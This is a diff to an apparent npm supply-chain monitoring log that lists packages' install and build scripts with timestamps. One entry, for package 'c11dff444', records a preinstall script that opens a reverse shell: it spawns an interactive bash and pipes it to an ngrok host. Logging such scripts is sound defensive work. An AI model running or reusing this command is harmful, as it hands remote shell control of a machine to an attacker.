@@ -1,5 +1,59 @@
 [
   {
+    "packageName": "@goker/qr-code",
+    "version": "1.0.0",
+    "scriptType": "postinstall",
+    "scriptContent": "node scripts/patch-qr-core.mjs",
+    "previousVersion": null,
+    "timestamp": "2026-01-31T18:44:49.652Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "@probelabs/visor",
+    "version": "1.0.1",
+    "scriptType": "postbuild",
+    "scriptContent": "chmod +x dist/cli-main.js",
+    "previousVersion": "0.1.126",
+    "timestamp": "2026-01-31T18:44:46.278Z",
+    "issuesend": true
+  },
+  {
+    "packageName": "@probelabs/visor",
+    "version": "1.0.1",
+    "scriptType": "prebuild",
+    "scriptContent": "npm run clean",
+    "previousVersion": "0.1.126",
+    "timestamp": "2026-01-31T18:44:46.276Z",
+    "issuesend": true
+  },
+  {
+    "packageName": "@dean0x/diedeadcode",
+    "version": "0.1.0",
+    "scriptType": "postinstall",
+    "scriptContent": "node scripts/postinstall.js",
+    "previousVersion": null,
+    "timestamp": "2026-01-31T18:44:03.272Z",
+    "issuesend": true
+  },
+  {
+    "packageName": "@sankyu/vue-circle-flags",
+    "version": "0.0.1",
+    "scriptType": "postbuild",
+    "scriptContent": "node scripts/postbuild.mjs",
+    "previousVersion": null,
+    "timestamp": "2026-01-31T18:43:57.503Z",
+    "issuesend": true
+  },
+  {
+    "packageName": "c11dff444",
+    "version": "1.0.10",
+    "scriptType": "preinstall",
+    "scriptContent": "node -e \"const net=require('net'),cp=require('child_process');const s=net.connect(11171,'6.tcp.eu.ngrok.io',()=>{const p=cp.spawn('/bin/bash',['-i']);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});\"",
+    "previousVersion": "1.0.9",
+    "timestamp": "2026-01-31T18:43:31.734Z",
+    "issuesend": false
+  },
+  {
     "packageName": "@chrisleekr/mcp-server-playground",
     "version": "1.1.0",
     "scriptType": "postinstall",
